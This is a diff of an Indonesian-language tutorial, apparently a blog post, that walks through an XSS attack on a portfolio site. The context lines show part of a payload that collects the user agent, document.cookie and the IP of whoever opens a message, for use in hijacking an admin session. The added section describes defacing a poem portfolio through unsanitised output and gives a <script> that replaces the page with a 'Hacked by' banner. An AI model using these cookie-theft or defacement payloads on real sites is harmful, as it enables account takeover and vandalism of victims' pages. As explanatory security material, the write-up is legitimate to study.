@@ -18,7 +18,6 @@ var getTheirIp = function(onDone) {
 };
 
 var postToMe = function(ipAddr) {
-    var date = new Date();
     var data = {
         UA: navigator.userAgent,
         Cookie: document.cookie,
@@ -45,3 +44,16 @@ Fungsi dari payload diatas adalah mengirimkan data-data dari yang membuka pesan 
 - IP dari admin
 
 Ketika hacker sudah mendapatkan data-data diatas, dia akan mencoba untuk melakukan session hijacking dengan memanfaatkan cookie yang telah dicuri. Alamat URL sudah diketahui dari data yang diterima. Hacker tinggal mengubah Cookie pada browser sesuai dengan cookie admin yang dicuri dan harusnya akses bisa dibobol.
+
+Langkah selanjutnya adalah melakukan deface dengan mengganti isi dari konten salah satu portfolio. Kita ambil contoh Portfolio berjudul Puisi Kita. Kebetulan Mas John tidak melakukan sanisasi terhadap output dari portfolio yang ditampilkan dari database. Sehingga memungkinkan hacker memasukkan kode HTML/Javascript apapun pada konten.
+
+```
+Puisi kita adalah sebuab website kolaborasi tulisan antar seniman puisi. Pengguna dapat mengirimkan puisi dan memberikan tanggapan pada setiap puisi yang ada.
+
+<script>
+var body = '<div style="text-align:center;margin-top:100px;"><h2>Hacked by Mas Kher</h2><p>Special thanks to 4L4Y_N4ME.</p></div>';
+document.body.innerHTML = body;
+document.body.style.color = 'white';
+document.body.style.backgroundColor = '#333333';
+</script>
+```
